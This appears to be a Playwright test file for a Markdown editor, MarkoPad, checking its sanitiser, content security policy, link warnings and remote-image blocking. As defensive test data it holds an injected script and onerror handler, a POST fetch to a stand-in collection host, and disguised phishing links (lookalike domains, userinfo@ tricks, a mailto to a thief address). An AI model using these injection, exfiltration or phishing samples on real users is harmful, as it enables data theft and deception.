  });
  await fresh(page);
  let dialogs = 0;
  page.on('dialog', (d) => { dialogs++; d.dismiss(); });
  const all = HOSTILE.concat([HOSTILE.join('\n\n')]);
  for (const doc of all) {
    await setText(page, doc);
    const report = await page.evaluate(([tags, attrs]) => {
      const bad = [];
      document.querySelectorAll('#preview *').forEach((el) => {
        const tag = el.tagName.toLowerCase();
        if (!tags.includes(tag)) bad.push('tag ' + tag);
        for (const a of el.attributes) {
          if (a.name.startsWith('data-mp-')) continue;
          if (tag === 'button' && a.name === 'hidden') continue;      // MarkoPad's own placeholder button
          if (!attrs.includes(a.name)) bad.push(`${tag}[${a.name}]`);
          if (a.name === 'class' && !/^(mp-[a-z-]+ ?)+$/.test(a.value)) bad.push(`class=${a.value}`);
          if (a.name === 'src' && !/^data:image\//.test(a.value)) bad.push(`src=${a.value}`);
        }
        if (tag === 'input' && (el.type !== 'checkbox' || !el.disabled)) bad.push('live input');
        const pos = getComputedStyle(el).position;
        if (pos === 'fixed' || pos === 'absolute' || pos === 'sticky') bad.push(`${tag} position ${pos}`);
      });
      return { bad, pwned: window.__pwned, bar: getComputedStyle(document.getElementById('bar')).display,
        editorIsTextarea: document.getElementById('editor').tagName };
    }, [[...OK_TAGS], [...OK_ATTRS]]);
    expect(report, `document: ${doc.slice(0, 70)}`).toEqual({ bad: [], pwned: undefined, bar: 'flex', editorIsTextarea: 'TEXTAREA' });
  }
  expect(dialogs).toBe(0);
  expect(requests, 'requests made while showing hostile documents').toEqual([]);
  // The browser applies the page policy while the sanitizer is still parsing a document off-page,
  // so it reports the inline styling, inline event handlers and <base> it meets there, before they
  // are removed. (The audit above is what proves none of it reached the page.) Nothing else may be
  // reported, and above all no report may name a network address: no fetch, frame, object or image.
  const reports = await violations(page);
  expect(reports.filter((v) => !/^(style-src-attr|style-src-elem|script-src-attr) <- inline$|^base-uri <- /.test(v)), 'policy reports other than off-page markup').toEqual([]);
});

test('X-9: the page policy blocks injected script and any data connection', async ({ page }) => {
  await fresh(page);
  expect(await violations(page)).toEqual([]);
  const result = await page.evaluate(async () => {
    const s = document.createElement('script');
    s.textContent = 'window.__injected = 1';
    document.body.append(s);
    const a = document.createElement('div');
    a.innerHTML = '<img src="data:image/png;base64,AAAA" onerror="window.__handler = 1">';
    document.body.append(a);
    let fetched = 'allowed';
    try { await fetch('https://example.test/collect', { method: 'POST', body: 'x' }); } catch (e) { fetched = 'blocked'; }
    await new Promise((r) => setTimeout(r, 200));
    return { injected: window.__injected, handler: window.__handler, fetched };
  });
  expect(result).toEqual({ injected: undefined, handler: undefined, fetched: 'blocked' });
  const seen = (await violations(page)).join('\n');
  expect(seen).toContain('script-src');
  expect(seen).toContain('connect-src');
});

test('X-4, X-5, X-6, X-7: every link click is confirmed and shows the real destination', async ({ page, context }) => {
  await context.route('https://example.com/**', (r) => r.fulfill({ contentType: 'text/html', body: '<title>destination</title>ok' }));
  await fresh(page);
  await setText(page, '[a normal link](https://example.com/page?x=1 "Totally https://bank.example")\n\n' +
    '[ftp](ftp://example.com/file) [rel](other.md) <someone@example.com>');
  const link = page.locator('#preview a.mp-link').first();
  expect(await page.locator('#preview a[href]').count()).toBe(0);            // nothing can navigate on its own
  await expect(link).toHaveAttribute('title', 'Goes to: https://example.com/page?x=1');
  await link.hover();
  await expect(page.locator('#status-msg')).toHaveText('Link goes to: https://example.com/page?x=1');
  await expect(page.locator('#preview p').nth(1)).toHaveText('ftp rel someone@example.com');
  expect(await page.locator('#preview a').count()).toBe(2);                   // the ftp and relative links are not links
  await expect(page.locator('#preview .mp-unavailable')).toHaveText('rel');

  let opened = 0;
  context.on('page', () => opened++);
  await link.click();
  await expect(page.locator('#dlg')).toBeVisible();
  await expect(page.locator('#dlg-title')).toHaveText('Open this link?');
  await expect(page.locator('#dlg-body .host')).toHaveText('example.com');
  await expect(page.locator('#dlg-body .addr')).toHaveText('https://example.com/page?x=1');
  await expect(page.getByRole('button', { name: 'Cancel' })).toBeFocused();
  await page.keyboard.press('Escape');
  await expect(page.locator('#dlg')).toBeHidden();
  await link.click({ button: 'middle' });
  await expect(page.locator('#dlg')).toBeVisible();
  await page.getByRole('button', { name: 'Cancel' }).click();
  await link.click({ modifiers: [mod] });
  await expect(page.locator('#dlg')).toBeVisible();
  await page.getByRole('button', { name: 'Cancel' }).click();
  await link.focus();
  await page.keyboard.press('Enter');
  await expect(page.locator('#dlg')).toBeVisible();
  expect(opened).toBe(0);
  const [dest] = await Promise.all([context.waitForEvent('page'), page.getByRole('button', { name: 'Open in a new tab' }).click()]);
  await dest.waitForLoadState();
  expect(dest.url()).toBe('https://example.com/page?x=1');
  expect(await dest.evaluate(() => ({ opener: window.opener, referrer: document.referrer }))).toEqual({ opener: null, referrer: '' });
  await dest.close();

  await page.locator('#preview a.mp-link').nth(1).click();
  await expect(page.locator('#dlg-body .host')).toHaveText('someone@example.com');
  await expect(page.getByRole('button', { name: 'Write the email' })).toBeVisible();
});

test('X-8: disguised links are flagged, ordinary ones are not', async ({ page }) => {
  await fresh(page);
  const suspicious = [
    ['[https://paypal.com/signin](https://evil.test/login)', 'The text shows paypal.com, but the link goes to evil.test.'],
    ['[www.mybank.com](https://mybank.com.evil.test/)', 'The text shows mybank.com, but the link goes to mybank.com.evil.test.'],
    ['[mybank.com](https://evil.test)', 'The text shows mybank.com'],
    ['[bank](https://xn--pypal-4ve.com/)', 'letters from another alphabet'],
    ['[bank](https://раураl.com/)', 'letters from another alphabet'],
    ['[router](http://192.168.1.1/admin)', 'bare numeric address'],
    ['[bank](https://mybank.com@evil.test/)', 'in front of an @ sign'],
    ['[boss@example.com](mailto:thief@evil.test)', 'the email would go to thief@evil.test'],
  ];
  for (const [doc, reason] of suspicious) {
    await setText(page, doc);
    const link = page.locator('#preview a.mp-link');
    await expect(link, doc).toHaveClass(/mp-suspicious/);
    await expect(link.locator('.mp-flag')).toHaveText('⚠');
    await link.click();
    await expect(page.locator('#dlg-title')).toHaveText('Check this link carefully');
    await expect(page.locator('#dlg-body .warnbox')).toContainText(reason);
    await page.keyboard.press('Escape');
  }
  const fine = [
    '[the docs](https://example.com/docs)',
    '[README.md](https://example.com/repo/README.md)',
    '[Node.js](https://nodejs.org/)',
    '[example.com](https://www.example.com/path)',
    '[example.com](https://docs.example.com/)',
    '[https://example.com/a](https://example.com/b)',
    '<https://example.com/x>',
    'https://example.com/auto',
    '<someone@example.com>',
    '[v1.2](https://example.com/releases)',
  ];
  for (const doc of fine) {
    await setText(page, doc);
    await expect(page.locator('#preview a.mp-link'), doc).toHaveCount(1);
    await expect(page.locator('#preview a.mp-suspicious'), doc).toHaveCount(0);
  }
});

test('MD-5: a link to a heading scrolls the preview without asking', async ({ page }) => {
  await fresh(page);
  await setText(page, '[go to the end](#the-end)\n\n' + 'filler paragraph\n\n'.repeat(120) + '## The End\n\nlast');
  await page.locator('#preview a.mp-anchor').click();
  await expect(page.locator('#dlg')).toBeHidden();
  await expect(page.locator('#preview h2')).toBeInViewport();
});

/* ------------------------------------------------------------------ privacy */

test('P-2 to P-8: remote images stay blocked until approved, one at a time, by site, or all', async ({ page, context }) => {
  const hits = [];
  await context.route(/https:\/\/img-[ab]\.test\//, (route) => {
    hits.push({ url: route.request().url(), referer: route.request().headers()['referer'] });
    route.fulfill({ contentType: 'image/png', body: PNG });
  });
  const doc = '![one](https://img-a.test/1.png)\n\n![two](https://img-a.test/2.png)\n\n![three](https://img-a.test/3.png)\n\n' +
    '![other](https://img-b.test/x.png)\n\n![inline](data:image/png;base64,' + PNG.toString('base64') + ')\n\n![rel](pics/cat.png)\n\n' +
    '<img src="https://img-b.test/html.png" alt="from html">';
  await fresh(page);
  await setText(page, doc);
  await page.waitForTimeout(300);
  expect(hits).toEqual([]);
  await expect(page.locator('#img-notice-text')).toHaveText('5 remote images are blocked, from 2 sites.');
  await expect(page.locator('#preview .mp-blocked')).toHaveCount(5);
  await expect(page.locator('#preview .mp-blocked').first()).toContainText('Image blocked, from img-a.test (“one”)');
  await expect(page.locator('#preview img')).toHaveCount(1);                       // only the embedded one
  await expect(page.locator('#preview .mp-unavailable-img')).toHaveText('Image unavailable: rel');
  await expect(page.locator('#img-why')).toHaveAttribute('href', '#help=remote-images-and-your-privacy');

  await page.locator('#preview .mp-blocked').first().getByRole('button', { name: 'Load', exact: true }).click();
  await expect.poll(() => hits.map((h) => h.url)).toEqual(['https://img-a.test/1.png']);
  await expect(page.locator('#img-notice-text')).toHaveText('4 remote images are blocked, from 2 sites.');

  await page.locator('#preview .mp-blocked').first().getByRole('button', { name: 'Load all 2 from this site' }).click();
  await expect.poll(() => hits.map((h) => h.url).sort()).toEqual(['https://img-a.test/1.png', 'https://img-a.test/2.png', 'https://img-a.test/3.png']);
  await expect(page.locator('#img-notice-text')).toHaveText('2 remote images are blocked, from 1 site.');

  // Approvals survive a reload of this tab, with the recovery copy...
  await page.waitForTimeout(500);
  await page.reload();
  await expect(page.locator('#preview .mp-blocked')).toHaveCount(2);
  await expect(page.locator('#preview img')).toHaveCount(4);

  await expect(page.locator('#img-loaded-text')).toHaveText('3 are loaded.');
  await expect(page.locator('#img-block-again')).toBeVisible();
  await page.click('#img-load-all');
  await expect.poll(() => hits.filter((h) => h.url.includes('img-b')).length).toBe(2);
  expect(hits.every((h) => h.referer === undefined), 'image hosts are not told which page asked').toBe(true);

  // P-10: with everything loaded the bar turns into a reminder, and Block again takes it all back.
  await expect(page.locator('#img-notice-text')).toHaveText('5 remote images are loaded, from 2 sites.');
  await expect(page.locator('#img-load-all')).toBeHidden();
  await expect(page.locator('#img-notice')).toHaveClass(/calm/);
  hits.length = 0;
  await page.click('#img-block-again');
  await expect(page.locator('#preview .mp-blocked')).toHaveCount(5);
  await expect(page.locator('#preview img')).toHaveCount(1);
  await expect(page.locator('#img-notice-text')).toHaveText('5 remote images are blocked, from 2 sites.');
  await expect(page.locator('#img-block-again')).toBeHidden();
  await expect(page.locator('#img-notice')).not.toHaveClass(/calm/);
  await page.waitForTimeout(600);
  await page.reload();
  await expect(page.locator('#preview .mp-blocked')).toHaveCount(5);     // the approvals are really forgotten
  await page.waitForTimeout(300);
  expect(hits).toEqual([]);
  await page.click('#img-load-all');
  await expect(page.locator('#preview .mp-blocked')).toHaveCount(0);
  await expect.poll(() => hits.length).toBe(5);       // let those requests finish before moving on

  // ...and are cleared when another document is opened (P-5).
  hits.length = 0;
  await page.locator('#file-input').setInputFiles({ name: 'next.md', mimeType: 'text/markdown', buffer: Buffer.from(doc) });
  await page.getByRole('button', { name: 'Replace' }).click();
  await expect(page.locator('#preview .mp-blocked')).toHaveCount(5);
  await page.waitForTimeout(300);
  expect(hits).toEqual([]);
});

test('P-1, P-9: a full working session makes no network request at all', async ({ page, context }) => {
  await fresh(page);
  const requests = [];
  context.on('request', (r) => { if (/^https?:/.test(r.url())) requests.push(r.url()); });
  await page.evaluate(() => { window.print = () => {}; });
  await page.locator('#editor').click();
  await page.keyboard.type('# Private notes\n\nSome text with a [link](https://example.com) and ![img](https://img-a.test/p.png)\n\n- item');
  await settle(page);
  await page.click('#btn-howto');
  await page.fill('#howto-search', 'image');
  await page.locator('.how:not([hidden])').first().getByRole('button', { name: 'Insert' }).click();
  await page.click('#howto-close');
  await page.click('#btn-theme'); await page.click('#view-preview'); await page.click('#view-both'); await page.click('#btn-sync');
  await page.click('#btn-download');
  const [d1] = await Promise.all([page.waitForEvent('download'), page.click('#act-save-md')]);
  await page.click('#btn-download');
  const [d2] = await Promise.all([page.waitForEvent('download'), page.click('#act-save-html')]);
  await d1.path(); await d2.path();
  await page.click('#btn-download'); await page.click('#act-print');
  await page.click('#btn-copy'); await page.click('#act-copy-rich');
  await page.locator('#preview a.mp-link').first().click();
  await page.getByRole('button', { name: 'Cancel' }).click();
  await page.locator('#file-input').setInputFiles({ name: 'n.md', mimeType: 'text/markdown', buffer: Buffer.from('# Next\n\n![i](https://img-b.test/q.png)') });
  await page.getByRole('button', { name: 'Replace' }).click();
  await settle(page);
  await page.click('#btn-new');
  await page.waitForTimeout(500);
  expect(requests).toEqual([]);
  expect(await violations(page)).toEqual([]);
});

test('P-1, D-1: loading the page is a single request, and nothing follows it', async ({ page, context }) => {
  const requests = [];
  context.on('request', (r) => { if (/^https?:/.test(r.url())) requests.push(r.url().replace(/#.*$/, '')); });
  const response = await page.goto('/#new');
  expect(response.status()).toBe(200);
  await page.locator('#editor').fill('# Hello\n\n![x](https://img-a.test/1.png)');
  await settle(page);
  await page.waitForTimeout(1500);
  expect(requests).toEqual([BASE + '/']);
  expect(await page.evaluate(() => document.characterSet)).toBe('UTF-8');
  expect(await violations(page)).toEqual([]);
  if (BASE.startsWith('https://')) {
    // On a hosted copy: the page is a secure context, so the modern clipboard is available,
    // and the server sent no policy header of its own that could clash with the page's.
    expect(await page.evaluate(() => window.isSecureContext && !!navigator.clipboard)).toBe(true);
    expect(response.headers()['content-security-policy']).toBeUndefined();
    expect(response.headers()['x-content-type-options']).toBe('nosniff');
  }
});

/* ------------------------------------------------------------------ help */

test('H-1: every control has a tooltip', async ({ page }) => {
  await fresh(page);
  const missing = await page.evaluate(() =>
    [...document.querySelectorAll('#bar button, #bar a.btn, #toolbar button, #divider, #img-notice button, #img-notice a, #howto-close')]
      .filter((e) => !(e.title || '').trim()).map((e) => e.id || e.textContent));
  expect(missing).toEqual([]);
});

test('H-2, H-3, H-4: How do I…? searches, shows the result, inserts at the cursor', async ({ page }) => {
  await fresh(page);
  await setText(page, 'before\n\nafter');
  await page.locator('#editor').evaluate((e) => { e.focus(); e.setSelectionRange(6, 6); });
  await page.click('#btn-howto');
  const cards = page.locator('.how');
  expect(await cards.count()).toBeGreaterThan(25);
  // Every example really produces something, and none of them is blocked or broken.
  const empty = await page.evaluate(() => [...document.querySelectorAll('.how')].filter((c) => c.querySelector('.how-src'))
    .filter((c) => { const s = c.querySelector('.md'); return !s || (!s.textContent.trim() && !s.querySelector('img,hr')) || s.querySelector('.mp-blocked,.mp-unavailable,.mp-unavailable-img'); })
    .map((c) => c.querySelector('h3').textContent));
  expect(empty.filter((t) => t !== 'Hidden note')).toEqual([]);
  for (const [title, selector] of [['Strikethrough', 'del'], ['Highlight', 'mark'], ['Collapsible section', 'details > summary'],
    ['Keyboard key', 'kbd'], ['Underline', 'u'], ['Centred text', 'p[align="center"]'], ['Image', 'img'], ['Checklist', 'input[type="checkbox"]'],
    ['List inside a list', 'ul ul'], ['Table column alignment', 'td[align="right"]'], ['Line break inside a paragraph', 'br'], ['Email link', 'a.mp-link']]) {
    await expect(cards.filter({ has: page.getByRole('heading', { name: title, exact: true }) }).locator('.md ' + selector).first(), title).toBeAttached();
  }
  await page.fill('#howto-search', 'table');
  await expect(page.locator('.how:not([hidden]) h3')).toHaveText(['Table', 'Table column alignment']);
  await page.fill('#howto-search', 'cross out');
  await expect(page.locator('.how:not([hidden]) h3')).toHaveText(['Strikethrough']);
  await page.fill('#howto-search', 'qqqq');
  await expect(page.locator('#howto-empty')).toBeVisible();
  await page.fill('#howto-search', 'table');
  await page.locator('.how:not([hidden])').first().getByRole('button', { name: 'Insert' }).click();
  expect(await editorValue(page)).toBe('before\n\n| Name | Role |\n| --- | --- |\n| Ada | Engineer |\n| Lin | Designer |\n\nafter');
  await expect(page.locator('#preview table')).toBeVisible();
  await page.keyboard.press(`${mod}+Z`);
  expect(await editorValue(page)).toBe('before\n\nafter');
  await page.locator('#howto-search').focus();
  await page.keyboard.press('Escape');
  await expect(page.locator('#howto')).toBeHidden();
});

test('H-5, H-6, H-7: Help opens in its own tab as a MarkoPad document', async ({ page, context }) => {
  await fresh(page);
  await setText(page, 'my own document');
  const [help] = await Promise.all([context.waitForEvent('page'), page.click('#btn-help')]);
  await help.waitForLoadState();
  await expect(help.locator('#preview h1')).toHaveText('MarkoPad Help');
  await expect(help).toHaveTitle('MarkoPad Help · MarkoPad');
  expect(new URL(help.url()).hash).toBe('');
  const version = JSON.parse(readFileSync(join(dirname(DIST), '..', 'package.json'), 'utf8')).version;
  await expect(help.locator('#preview')).toContainText(`Version ${version}.`);
  expect(await help.locator('#editor').inputValue()).toContain('# MarkoPad Help');
  // Every entry in its table of contents leads to a real heading.
  await help.locator('#preview a.mp-anchor').first().click();
  await expect(help.getByRole('heading', { name: 'Quick start' })).toBeInViewport();
  const dead = await help.evaluate(() => {
    const slugs = new Set([...document.querySelectorAll('#preview [data-mp-slug]')].map((h) => h.getAttribute('data-mp-slug')));
    return [...document.querySelectorAll('#preview a.mp-anchor')].map((a) => a.getAttribute('data-mp-target')).filter((t) => !slugs.has(t));
  });
  expect(dead).toEqual([]);
  await expect(help.locator('#preview a.mp-suspicious')).toHaveCount(1);          // its own worked example
  await expect(help.locator('#img-notice-text')).toHaveText('1 remote image is blocked, from 1 site.');
  // The original tab is untouched, and reloading the help keeps it.
  expect(await editorValue(page)).toBe('my own document');
  await help.reload();
  await expect(help.locator('#preview h1')).toHaveText('MarkoPad Help');
  await help.close();
  await setText(page, '![x](https://img-a.test/1.png)');
  const [why] = await Promise.all([context.waitForEvent('page'), page.click('#img-why')]);
  await why.waitForLoadState();
  await expect(why.getByRole('heading', { name: 'Remote images and your privacy' })).toBeInViewport();
});

/* ------------------------------------------------------------------ hosting */

test('D-4: the file works when opened straight from a disk', async ({ page }) => {
  const url = pathToFileURL(DIST).href;
  await page.goto(url + '#new');
  expect(await page.evaluate(() => location.hash)).toBe('');
  await page.locator('#editor').fill('# From disk\n\n**works** [l](https://example.com)');
  await settle(page);
  await expect(page.locator('#preview h1')).toHaveText('From disk');
  await page.waitForTimeout(500);
  await page.reload();
  await expect(page.locator('#editor')).toHaveValue('# From disk\n\n**works** [l](https://example.com)');
  await expect(page.locator('#recovery')).toHaveText('Recovery copy: on');
  await page.locator('#preview a.mp-link').click();
  await expect(page.locator('#dlg-body .host')).toHaveText('example.com');
  await page.keyboard.press('Escape');
  const [dl] = await Promise.all([page.waitForEvent('download'), page.locator('#editor').press(`${mod}+S`)]);
  expect(dl.suggestedFilename()).toBe('From-disk.md');
  const [second] = await Promise.all([page.context().waitForEvent('page'), page.click('#btn-window')]);
  await second.waitForLoadState();
  await expect(second.locator('#editor')).toHaveValue('');
  expect(await second.evaluate(() => location.hash)).toBe('');
  await second.close();
  await expect(page.locator('#editor')).toHaveValue('# From disk\n\n**works** [l](https://example.com)');
  await page.goto('about:blank');
  await page.goto(url + '#help');
  await expect(page.locator('#preview h1')).toHaveText('MarkoPad Help');
  expect(await page.evaluate(() => location.hash)).toBe('');
  expect(await violations(page)).toEqual([]);
});

test('N-5: with JavaScript off the page explains itself', async ({ browser }) => {
  const context = await browser.newContext({ javaScriptEnabled: false, baseURL: BASE });
  const page = await context.newPage();
  await page.goto('/');
  await expect(page.locator('#noscript')).toContainText('MarkoPad needs JavaScript');
  await context.close();
});

// Timings depend on the machine, so this test records them and only fails on gross slowness.
test('N-1, N-2: the file is small; large documents stay usable', async ({ page }) => {
  test.setTimeout(240000);
  expect(readFileSync(DIST).length).toBeLessThan(250 * 1024);
  for (const kb of [250, 1024]) {
    await fresh(page);
    const sections = await page.evaluate((kb) => {
      let s = '', i = 0;
      for (; s.length < kb * 1024; i++) s += `## Section ${i}\n\nSome *ordinary* text number ${i} with a [link](https://example.com/${i}) and \`code\`, long enough to be a real paragraph of prose.\n\n- one ${i}\n- two\n\n| a | b |\n| - | - |\n| ${i} | 2 |\n\n`;
      const e = document.getElementById('editor');
      window.__t0 = performance.now();
      e.value = s;
      e.dispatchEvent(new InputEvent('input', { bubbles: true }));
      return i;
    }, kb);
    // The page must stay responsive while a large document is being prepared.
    const whileBusy = await page.evaluate(() => new Promise((done) => {
      let worst = 0, last = performance.now(), ticks = 0;
      const tick = () => { const now = performance.now(); worst = Math.max(worst, now - last); last = now; if (++ticks < 40) setTimeout(tick, 10); else done(Math.round(worst)); };
      setTimeout(tick, 10);
    }));
    await page.waitForFunction((n) => document.querySelectorAll('#preview h2').length >= n, sections, { timeout: 120000 });
    const first = Math.round(await page.evaluate(() => performance.now() - window.__t0));
    await page.waitForTimeout(1500);
    await page.locator('#editor').evaluate((e) => { e.focus(); const mid = e.value.indexOf('\n\n', e.value.length / 2); e.setSelectionRange(mid, mid); });
    const t1 = Date.now();
    await page.keyboard.type(' typed in the middle');
    const perKey = Math.round((Date.now() - t1) / 20);
    const t2 = Date.now();
    await page.waitForFunction(() => document.getElementById('preview').textContent.includes('typed in the middle'), null, { timeout: 60000 });
    console.log(`${kb} KB document: first display ${first} ms (longest stall while preparing ${whileBusy} ms); typing ${perKey} ms per key; preview caught up ${Date.now() - t2} ms after the last key`);
    expect(perKey, `typing in a ${kb} KB document`).toBeLessThan(kb <= 250 ? 150 : 600);
  }
});
